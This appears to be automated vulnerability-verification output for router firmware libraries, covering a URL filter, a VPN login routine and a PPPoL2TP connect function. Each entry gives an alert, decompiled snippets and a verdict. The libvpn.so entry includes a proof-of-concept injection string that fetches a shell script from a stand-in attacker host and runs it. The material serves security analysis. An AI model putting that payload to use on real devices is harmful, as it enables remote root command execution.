- **Notes:** The vulnerability requires the attacker to send a crafted network packet with a long URL that triggers the URL filter. The skb buffer management might mitigate some risks, but the lack of input sanitization in sprintf makes exploitation plausible. Further analysis is needed to determine exact buffer sizes and exploitation feasibility. Associated functions: sym.url_filter, sym.set_url_filter.

## Verification Conclusion

- **Description Accuracy:** `inaccurate`
- **Is Real Vulnerability:** `False`
- **Risk Level:** `N/A`
- **Detailed Reason:** The alert description claims that in the sym.return_web_disable_page function, sprintf uses user-controlled URL data, but the disassembled code shows: in the sprintf call at 0x08004f68, parameter s3 is the return value of get_lan_ip (local IP), v0 is the result of strlen(s7), and s7 is fixed HTML content (generated from $LC2). No user input is directly used as a parameter for sprintf. The attacker model (unauthenticated remote attacker) cannot control these parameters, so the input is not controllable and the path is unreachable. The buffer s2 may be limited, but since the data is internally generated, overflow can only be caused by internal errors, not attacker exploitation. Therefore, the vulnerability does not exist.

## Verification Metrics

- **Verification Duration:** 312.75 s
- **Token Usage:** 319662

---

## Original Information

- **File/Directory Path:** `lib/libvpn.so`
- **Location:** `libvpn.so:0x000031e4 sym.vpnUsrLoginAddRoute`
- **Description:** The function 'sym.vpnUsrLoginAddRoute' in 'libvpn.so' contains a stack buffer overflow and command injection vulnerability due to improper handling of input from login files. The function reads data from files in '/tmp/pptp/logininfo%d' or '/tmp/l2tp/logininfo%d' using sscanf with the format "%[^;];%[^;];%[^;];%[^;];%s", writing string data to fixed-size buffers, including a 4-byte uint variable (&uStack_84), causing stack overflow. The overflowed data is then used in system commands executed via 'doSystemCmd', such as 'ip rule add' and 'ip route add', without sanitization, allowing command injection if input contains shell metacharacters. An attacker with valid login credentials can exploit this by creating a malicious login file in the world-writable /tmp directory and triggering the VPN login process, leading to arbitrary command execution as the process user (likely root or a privileged user).
- **Code Snippet:**
  ```
  iVar1 = (**(iStack_1a8 + -0x7f5c)) (auStack_140,"%[^;];%[^;];%[^;];%[^;];%s" + *(iStack_1a8 + -0x7fe0),auStack_c0,&uStack_84, acStack_180,auStack_ac,auStack_98);
  ...
  (**(iStack_1a8 + -0x7f4c)) ("ip rule add to %s table wan%d prio %d" + *(iStack_1a8 + -0x7fe0),&uStack_84, uStackX_4, "t mangle %s POSTROUTING -o %s -j TCPMSS -p tcp --syn \t\t\t--set-mss %d");
  ```
- **Notes:** The vulnerability requires the function to be called with a user-controlled parameter for the login file index. Cross-references show this function is called from other VPN-related processes, likely during user authentication. Further analysis should verify the caller context and test exploitability with specific input. The use of 'doSystemCmd' with unsanitized input is a common pattern in other functions like 'sym.set_vpn_nat', suggesting broader issues.

## Verification Conclusion

- **Description Accuracy:** `accurate`
- **Is Real Vulnerability:** `True`
- **Risk Level:** `High`
- **Detailed Reason:** The security alert accurately describes the vulnerability. The disassembly code shows: 1) At address 0x000033f4, sscanf uses the format string "%[^;];%[^;];%[^;];%[^;];%s" to read file data, writing to fixed stack buffers (e.g., fp+0x48, fp+0x108, fp+0x144, etc.) without width limits, which can lead to stack buffer overflow (for example, if the input string exceeds the target buffer size). 2) At multiple locations (e.g., 0x0000381c, 0x000038b4, 0x0000391c), doSystemCmd directly uses user input to execute system commands without sanitizing the input, allowing command injection (e.g., if the input contains semicolons or backticks, arbitrary commands can be injected). Attacker model: An attacker can create a malicious file in the globally writable /tmp directory (e.g., /tmp/pptp/logininfo0) with content containing a malicious payload and trigger the VPN login process (e.g., via a network request); the process may run with root privileges, leading to privilege escalation. PoC steps: 1) Create a file /tmp/pptp/logininfo0 with the content "valid;`wget http://attacker.com/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh`;data;more;fields". 2) Trigger the VPN login (e.g., send an authentication request), resulting in command execution. The vulnerability chain is complete: input is controllable (file content), path is reachable (the function is called by the VPN process), actual impact (root privilege command execution).

## Verification Metrics

- **Verification Duration:** 308.94 s
- **Token Usage:** 275817

---

## Original Information

- **File/Directory Path:** `lib/pppol2tp.so`
- **Location:** `pppol2tp.so:0x1a78 connect_pppol2tp`
- **Description:** In the 'connect_pppol2tp' function, the local buffer 'auStack_34' (size 18 bytes) is passed to a function call that uses 'uStack_38' (set to 38 bytes) as the length parameter, causing a stack buffer overflow. Trigger condition: an attacker sends malicious data exceeding 18 bytes via a PPPoL2TP socket. Missing boundary check: the function does not validate if the input length fits the buffer size. Potential exploitation: the overflow can overwrite the return address or critical stack data, allowing the attacker to execute arbitrary code. Complete attack chain: an attacker, as an authenticated user, can access the socket, send malicious data to trigger the overflow, achieving privilege escalation or code execution.
- **Code Snippet:**
  ```
  uint dbg.connect_pppol2tp(void)
  {
      ...
      uchar auStack_34 [18];
      uStack_38 = 0x26;
      ...
      (**(iStack_40 + -0x7fd0))(uVar4,auStack_34,&uStack_38); // Buffer overflow: 38 bytes written to 18-byte buffer
      ...
  }
  ```
- **Notes:** The vulnerability requires the attacker to have access to the PPPoL2TP socket, possibly via network service or IPC. It is recommended to further verify the socket initialization logic and the source of global variables. Related function: disconnect_pppol2tp. Subsequent analysis direction: check components calling this function (such as the pppd daemon) to confirm the input source and exploit feasibility.

## Verification Conclusion

- **Description Accuracy:** `partially`
- **Is Real Vulnerability:** `True`
- **Risk Level:** `Medium`
- **Detailed Reason:** Verification result: Alert partially accurate. Decompilation evidence confirms the stack buffer overflow: in the connect_pppol2tp function, the 18-byte buffer auStack_34 is passed to a getsockname call while uStack_38 is set to 38 bytes, causing an overflow. Stack layout analysis shows the buffer starts at sp+0x1c and overflows to sp+0x42, while the return address is at sp+0x4c, so directly overwriting the return address is not feasible (10-byte gap), but it will overwrite other stack variables like auStack_22 (starting at sp+0x2e), potentially causing crashes or data corruption. Attacker model: an authenticated user can access the PPPoL2TP socket via network service or IPC and send malicious data exceeding 18 bytes to trigger the overflow. Vulnerability exploitability: input is controllable (attacker influences socket data), path is reachable (function executes when pppol2tp_fd is valid), but the actual impact is limited to denial of service or potential information leakage, not direct code execution. PoC steps: an attacker, as an authenticated user, establishes a PPPoL2TP connection and sends a specially crafted packet exceeding 18 bytes, triggering the getsockname write overflow, causing program exception.

## Verification Metrics

- **Verification Duration:** 397.00 s
- **Token Usage:** 263410

---

